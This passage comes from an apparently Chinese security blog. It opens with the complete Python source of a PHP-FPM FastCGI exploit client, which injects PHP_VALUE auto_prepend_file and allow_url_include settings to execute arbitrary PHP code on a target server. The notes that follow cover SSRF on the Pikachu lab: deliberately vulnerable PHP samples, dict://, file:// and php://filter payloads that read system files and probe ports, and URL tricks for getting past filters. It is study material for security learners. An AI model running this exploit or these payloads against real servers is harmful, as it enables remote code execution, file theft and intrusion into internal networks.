s</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_text</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">issubclass</span>(<span class=\"built_in\">type</span>(s), <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s, <span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FastCGIClient</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># private</span></span><br><span class=\"line\">    __FCGI_VERSION = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_ROLE_RESPONDER = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_ROLE_AUTHORIZER = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_ROLE_FILTER = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_TYPE_BEGIN = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_TYPE_ABORT = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_TYPE_END = <span class=\"number\">3</span></span><br><span class=\"line\">    __FCGI_TYPE_PARAMS = <span class=\"number\">4</span></span><br><span class=\"line\">    __FCGI_TYPE_STDIN = <span class=\"number\">5</span></span><br><span class=\"line\">    __FCGI_TYPE_STDOUT = <span class=\"number\">6</span></span><br><span class=\"line\">    __FCGI_TYPE_STDERR = <span class=\"number\">7</span></span><br><span class=\"line\">    __FCGI_TYPE_DATA = <span class=\"number\">8</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES = <span class=\"number\">9</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES_RESULT = <span class=\"number\">10</span></span><br><span class=\"line\">    __FCGI_TYPE_UNKOWNTYPE = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_HEADER_SIZE = <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># request state</span></span><br><span class=\"line\">    FCGI_STATE_SEND = <span class=\"number\">1</span></span><br><span class=\"line\">    FCGI_STATE_ERROR = <span class=\"number\">2</span></span><br><span class=\"line\">    FCGI_STATE_SUCCESS = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, host, port, timeout, keepalive</span>):</span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.timeout = timeout</span><br><span class=\"line\">        <span class=\"keyword\">if</span> keepalive:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">        self.requests = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__connect</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.settimeout(self.timeout)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># if self.keepalive:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class=\"line\">        <span class=\"comment\"># else:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            self.sock.connect((self.host, <span class=\"built_in\">int</span>(self.port)))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> msg:</span><br><span class=\"line\">            self.sock.close()</span><br><span class=\"line\">            self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">repr</span>(msg))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeFastCGIRecord</span>(<span class=\"params\">self, fcgi_type, content, requestid</span>):</span><br><span class=\"line\">        length = <span class=\"built_in\">len</span>(content)</span><br><span class=\"line\">        buf = bchr(FastCGIClient.__FCGI_VERSION) \\</span><br><span class=\"line\">              + bchr(fcgi_type) \\</span><br><span class=\"line\">              + bchr((requestid &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(requestid &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr((length &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(length &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + content</span><br><span class=\"line\">        <span class=\"keyword\">return</span> buf</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeNameValueParams</span>(<span class=\"params\">self, name, value</span>):</span><br><span class=\"line\">        nLen = <span class=\"built_in\">len</span>(name)</span><br><span class=\"line\">        vLen = <span class=\"built_in\">len</span>(value)</span><br><span class=\"line\">        record = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(nLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((nLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(nLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> vLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(vLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((vLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(vLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> record + name + value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIHeader</span>(<span class=\"params\">self, stream</span>):</span><br><span class=\"line\">        header = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;version&#x27;</span>] = bord(stream[<span class=\"number\">0</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;type&#x27;</span>] = bord(stream[<span class=\"number\">1</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;requestId&#x27;</span>] = (bord(stream[<span class=\"number\">2</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">3</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class=\"number\">4</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">5</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class=\"number\">6</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;reserved&#x27;</span>] = bord(stream[<span class=\"number\">7</span>])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIRecord</span>(<span class=\"params\">self, buffer</span>):</span><br><span class=\"line\">        header = buffer.read(<span class=\"built_in\">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> header:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record = self.__decodeFastCGIHeader(header)</span><br><span class=\"line\">            record[<span class=\"string\">&#x27;content&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;contentLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                contentLength = <span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;contentLength&#x27;</span>])</span><br><span class=\"line\">                record[<span class=\"string\">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;paddingLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                skiped = buffer.read(<span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;paddingLength&#x27;</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> record</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">request</span>(<span class=\"params\">self, nameValuePairs=&#123;&#125;, post=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.__connect():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">        requestId = random.randint(<span class=\"number\">1</span>, (<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">16</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.requests[requestId] = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        request = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">        beginFCGIRecordContent = bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\</span><br><span class=\"line\">                                 + bchr(self.keepalive) \\</span><br><span class=\"line\">                                 + bchr(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class=\"line\">                                              beginFCGIRecordContent, requestId)</span><br><span class=\"line\">        paramsRecord = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nameValuePairs:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (name, value) <span class=\"keyword\">in</span> nameValuePairs.items():</span><br><span class=\"line\">                name = force_bytes(name)</span><br><span class=\"line\">                value = force_bytes(value)</span><br><span class=\"line\">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> paramsRecord:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> post:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.sock.send(request)</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.__waitForResponse(requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__waitForResponse</span>(<span class=\"params\">self, requestId</span>):</span><br><span class=\"line\">        data = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            buf = self.sock.recv(<span class=\"number\">512</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">len</span>(buf):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += buf</span><br><span class=\"line\"></span><br><span class=\"line\">        data = BytesIO(data)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            response = self.__decodeFastCGIRecord(data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \\</span><br><span class=\"line\">                    <span class=\"keyword\">or</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                    self.requests[<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class=\"line\">                <span class=\"keyword\">if</span> requestId == <span class=\"built_in\">int</span>(response[<span class=\"string\">&#x27;requestId&#x27;</span>]):</span><br><span class=\"line\">                    self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] += response[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class=\"line\">                self.requests[requestId]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(self.host, self.port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;host&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;file&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-c&#x27;</span>, <span class=\"string\">&#x27;--code&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;What php code your want to execute&#x27;</span>, default=<span class=\"string\">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-p&#x27;</span>, <span class=\"string\">&#x27;--port&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;FastCGI port&#x27;</span>, default=<span class=\"number\">9000</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    client = FastCGIClient(args.host, args.port, <span class=\"number\">3</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    params = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">    documentRoot = <span class=\"string\">&quot;/&quot;</span></span><br><span class=\"line\">    uri = args.file</span><br><span class=\"line\">    content = args.code</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class=\"string\">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class=\"string\">&#x27;/&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;QUERY_STRING&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class=\"string\">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_PORT&#x27;</span>: <span class=\"string\">&#x27;12345&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PORT&#x27;</span>: <span class=\"string\">&#x27;80&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_NAME&#x27;</span>: <span class=\"string\">&quot;localhost&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class=\"string\">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_TYPE&#x27;</span>: <span class=\"string\">&#x27;application/text&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_LENGTH&#x27;</span>: <span class=\"string\">&quot;%d&quot;</span> % <span class=\"built_in\">len</span>(content),</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_VALUE&#x27;</span>: <span class=\"string\">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class=\"string\">&#x27;allow_url_include = On&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    response = client.request(params, content)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(force_text(response))</span><br></pre></td></tr></table></figure>\n<p>又是参考 P 师傅的一天～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZmFzdGNnaS1hbmQtcGhwLWZwbS5odG1s\">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==\">tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxNjQzMDAy\">SSRF–gopher 协议打 FastCGI_Z3eyOnd 的博客 - CSDN 博客_gopher fastcgi</span></p>\n<h3 id=\"ssrf-2\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-2\">#</a> SSRF</h3>\n<blockquote>\n<p><strong>SSRF (Server-Side Request Forgery: 服务器端请求伪造)</strong></p>\n<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制</p>\n<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>\n<p>数据流：攻击者 -----&gt; 服务器 ----&gt; 目标地址</p>\n<p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP中下面函数的使用不当会导致SSRF:</span><br><span class=\"line\">file_get_contents()</span><br><span class=\"line\">fsockopen()</span><br><span class=\"line\">curl_exec()</span><br><span class=\"line\">         </span><br></pre></td></tr></table></figure>\n<p>但注意 curl_exec () 不支持 php://filter 等伪协议，支持 dict</p>\n<p>但 file_get_contens () 支持 php://filter 伪协议读文件，不支持 dict</p>\n<p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求，<strong> 则请做好目标地址的过滤</strong>。</p>\n</blockquote>\n<h4 id=\"pikachu-curl-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-curl-ssrf\">#</a> pikachu - curl ssrf</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span><br><span class=\"line\">    $URL = $_GET[&#x27;url&#x27;];</span><br><span class=\"line\">    $CH = curl_init($URL);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_HEADER, FALSE);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\">    $RES = curl_exec($CH);</span><br><span class=\"line\">    curl_close($CH) ;</span><br><span class=\"line\">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><br><span class=\"line\">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><br><span class=\"line\">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><br><span class=\"line\">    echo $RES;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=dict://127.0.0.1:3306</span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=file:///C:\\Windows\\system.ini</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325170713312.png\" alt=\"image-20220325170713312\"></p>\n<p><code>curl_init </code> 只能用于 <code>tcp</code>  协议，因此可以用于读取文件或检测端口是否开启</p>\n<h4 id=\"pikachu-file_get_contents-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-file_get_contents-ssrf\">#</a> pikachu-file_get_contents ssrf</h4>\n<p><code>file_get_contents</code>  可以接收 <code>php</code>  伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><br><span class=\"line\">//内网请求:http://x.x.x.x/xx.index</span><br><span class=\"line\">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; $_GET[&#x27;file&#x27;] !=null)&#123;</span><br><span class=\"line\">    $filename = $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">    $str = file_get_contents($filename);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=C:\\Windows\\system.ini</span><br><span class=\"line\">//</span><br><span class=\"line\">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbMzg2RW5oXQ0Kd29hZm9udD1kb3NhcHAuZm9uDQpFR0E4MFdPQS5GT049RUdBODBXT0EuRk9ODQpFR0E0MFdPQS5GT049RUdBNDBXT0EuRk9ODQpDR0E4MFdPQS5GT049Q0dBODBXT0EuRk9ODQpDR0E0MFdPQS5GT049Q0dBNDBXT0EuRk9ODQoNCltkcml2ZXJzXQ0Kd2F2ZT1tbWRydi5kbGwNCnRpbWVyPXRpbWVyLmRydg0KDQpbbWNpXQ0K</span><br></pre></td></tr></table></figure>\n<h4 id=\"pikachu-fsockopen-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-fsockopen-ssrf\">#</a> pikachu-fsockopen ssrf</h4>\n<p>加载远程网站</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=www.baidu.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf防御\"><a class=\"markdownIt-Anchor\" href=\"#ssrf防御\">#</a> ssrf 防御</h3>\n<ol>\n<li>过滤开头不是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHAlM0ElMkYlMkZ4eHguY29t\"> http://xxx.com</span> 的所有链接，白名单限制 http/https 协议</li>\n<li>过滤格式为 ip 的链接，比如 127.0.0.1</li>\n<li>结尾必须是某个后缀</li>\n</ol>\n<h3 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h3>\n<p><code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的</p>\n<p><code>172.16.60.166/curl.php?url=http://wwwbaidu.com@172.16.60.166/curl.php?url=http://www.google.com</code></p>\n<p>绕过 IP 